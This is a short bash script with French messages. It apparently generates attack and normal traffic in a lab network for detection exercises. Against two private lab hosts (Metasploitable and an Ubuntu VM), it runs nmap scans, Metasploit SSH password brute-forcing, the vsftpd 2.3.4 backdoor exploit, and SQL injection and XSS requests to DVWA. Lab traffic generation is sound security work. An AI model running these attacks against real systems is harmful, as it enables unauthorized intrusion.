#!/bin/bash

META="192.168.56.102"
UBUNTU="192.168.56.103"

echo "=== Debut des attaques sur le reseau ==="

for i in $(seq 1 6)
do
    echo "========== Tour $i / 6 =========="

    echo "[*] [SCAN] Metasploitable + Ubuntu ..."
    nmap -T4 $META > /dev/null 2>&1
    nmap -T4 $UBUNTU > /dev/null 2>&1

    echo "[*] [BRUTEFORCE] SSH Metasploitable ..."
    msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS $META; set USERNAME msfadmin; set PASS_FILE ~/passwords.txt; set STOP_ON_SUCCESS true; run; exit -y" 2>/dev/null

    echo "[*] [BRUTEFORCE] SSH Ubuntu ..."
    msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS $UBUNTU; set USERNAME hacker_target; set PASS_FILE ~/passwords.txt; set STOP_ON_SUCCESS true; run; exit -y" 2>/dev/null

    echo "[*] [EXPLOIT] vsftpd Metasploitable ..."
    msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $META; run; exit -y" 2>/dev/null

    echo "[*] [WEB] Attaque web Metasploitable ..."
    nmap -p 80 --script http-enum $META > /dev/null 2>&1
    curl -s "http://$META/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit" > /dev/null 2>&1
    curl -s "http://$META/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>" > /dev/null 2>&1

    echo "[*] [NORMAL] Trafic legitime ..."
    ping -c 5 $META > /dev/null 2>&1
    ping -c 5 $UBUNTU > /dev/null 2>&1
    curl -s http://$META/ > /dev/null 2>&1
    curl -s http://$META/index.php > /dev/null 2>&1

    sleep 1
done

echo "=== Fini ! ==="
